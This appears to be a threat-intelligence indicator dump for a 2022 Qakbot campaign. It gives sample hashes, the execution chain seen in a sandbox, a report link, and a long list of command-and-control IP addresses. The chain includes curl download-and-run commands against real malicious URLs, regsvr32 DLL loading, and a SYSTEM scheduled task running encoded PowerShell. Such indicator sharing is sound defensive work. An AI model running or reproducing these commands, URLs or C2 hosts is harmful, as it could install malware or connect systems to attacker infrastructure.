@@ -1,0 +1,173 @@
+09.09.2022 | Qakbot | BB | Version 403.860 | Campaign | 1662650043
+
+******************************
+
+.html ec16c9672b26e63ffa77e33a099fa29e53233dbe3157daf45767f4bab1642f61 - Q834
+.zip 43fba22a16a3482e24625d6ecb54f11635885c1fdc6dc43d132918ec396942df
+.js 182bb1afe6562279ccb29e3ec6e1aa15caf7ac62c1b25a75f6981887637550a7
+.dll c98b8a97cd14554cf1f47562921122f1c1624ed5f9f3603847d0e16103b798d5
+
+******************************
+
+lnk content
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\maindata\Stata656.lnk
+
+"C:\Windows\System32\cmd.exe" /q /c echo 't5' && MD "C:\Users\Admin\AppData\Roaming\AF\yq9" && curl.exe --output C:\Users\Admin\AppData\Roaming\AF\yq9\MXoye8l.z2Xb.i8.js https://varejaocajuru.com.br/kUy/05.html && cd "C:\Users\Admin\AppData\Roaming\AF\yq9" && wscript MXoye8l.z2Xb.i8.js && echo "Vj"
+
+
+https://varejaocajuru.com.br/kUy/05.html .js
+https://prohabili.com.br/n3R/05.html .dll
+
+*************************************************
+
+Exec >>
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\maindata\Stata656.lnk
+
+cmd.exe /q /c echo 't5' && MD "C:\Users\Admin\AppData\Roaming\AF\yq9" && curl.exe --output C:\Users\Admin\AppData\Roaming\AF\yq9\MXoye8l.z2Xb.i8.js https://varejaocajuru.com.br/kUy/05.html && cd "C:\Users\Admin\AppData\Roaming\AF\yq9" && wscript MXoye8l.z2Xb.i8.js && echo "Vj"
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\MXoye8l.z2Xb.i8.js
+
+cmd.exe /C ping go.com && regsvr32 _KGM.dll
+
+regsvr32  _KGM.dll
+
+ping  go.com 
+
+explorer.exe
+
+schtasks.exe /Create /RU "NT AUTHORITY\SYSTEM" /Z /ST 13:28 /tn izfixwloa /ET 13:39 /tr "powershell.exe -encodedCommand cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAXwBLAEcATQAuAGQAbABsACIA" /SC ONCE
+
+powershell.exe -encodedCommand cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAXwBLAEcATQAuAGQAbABsACIA
+regsvr32.exe" C:\Users\Admin\AppData\Local\Temp\_KGM.dll
+
+C:\Windows\SysWOW64\explorer.exe
+
+*************************************************
+
+https://tria.ge/reports/220909-qp34xagbg7/
+
+*************************************************
+
+c2's
+
+
+191.97.234.238:995
+81.131.161.131:2078
+197.94.210.133:443
+193.3.19.37:443
+70.51.153.182:2222
+99.232.140.205:2222
+123.240.131.1:443
+177.102.84.28:32101
+105.156.152.227:443
+190.59.247.136:995
+89.211.218.88:2222
+81.214.220.237:443
+85.99.62.74:443
+217.165.68.122:993
+219.69.103.199:443
+37.210.148.30:995
+64.207.215.69:443
+113.169.57.104:443
+179.225.221.169:32101
+151.234.94.35:990
+84.238.253.171:443
+87.220.229.164:2222
+42.118.158.96:443
+61.105.45.244:443
+27.73.215.46:32102
+145.82.135.6:443
+105.105.104.0:443
+169.1.47.111:443
+78.182.113.80:443
+210.195.18.76:2222
+113.53.59.10:995
+88.246.170.2:443
+95.10.13.82:443
+171.248.157.128:995
+118.68.220.199:443
+139.195.63.45:2222
+118.216.99.232:443
+181.80.133.202:443
+102.40.236.32:995
+46.116.229.16:443
+61.70.29.53:443
+179.108.32.195:443
+171.238.230.59:443
+81.56.22.251:995
+31.32.180.179:443
+197.204.30.177:443
+186.64.87.202:443
+31.22.202.71:32101
+120.150.218.241:995
+173.189.167.21:995
+24.139.72.117:443
+104.34.212.7:32103
+47.23.89.61:995
+24.55.67.176:443
+172.115.177.204:2222
+217.165.77.134:995
+24.178.196.158:2222
+67.209.195.198:443
+111.125.245.116:995
+39.49.67.4:995
+78.101.202.75:50010
+37.34.253.233:443
+217.165.77.134:443
+46.107.48.202:443
+70.46.220.114:443
+63.143.92.99:995
+93.48.80.198:995
+179.158.103.236:443
+47.180.172.159:443
+47.23.89.61:993
+72.252.157.93:995
+182.191.92.203:995
+187.172.230.151:443
+72.252.157.93:990
+24.158.23.166:995
+32.221.224.140:995
+41.84.238.19:443
+41.228.22.180:443
+197.167.27.20:993
+45.46.53.140:2222
+47.156.129.52:443
+148.64.96.100:443
+63.143.92.99:443
+173.21.10.71:2222
+66.230.104.103:443
+76.25.142.196:443
+100.38.242.113:995
+208.107.221.224:443
+197.89.12.179:443
+39.44.34.119:995
+196.203.37.215:80
+39.57.40.50:995
+117.248.109.38:21
+121.7.223.38:2222
+85.104.122.231:443
+118.172.249.102:443
+1.161.70.129:443
+39.52.28.146:995
+188.136.218.20:61202
+212.70.96.76:995
+1.161.70.129:995
+174.69.215.101:443
+69.14.172.24:443
+86.213.191.206:2078
+176.45.233.14:995
+82.41.63.217:443
+67.69.166.79:2222
+217.164.237.54:2222
+217.164.121.130:1194
+39.41.114.133:995
+100.38.242.113:443
+120.61.3.17:443
+101.50.120.124:995
+217.128.122.65:2222
+217.128.122.65:443
+88.227.46.238:443
+223.229.136.61:443
+72.252.157.93:993
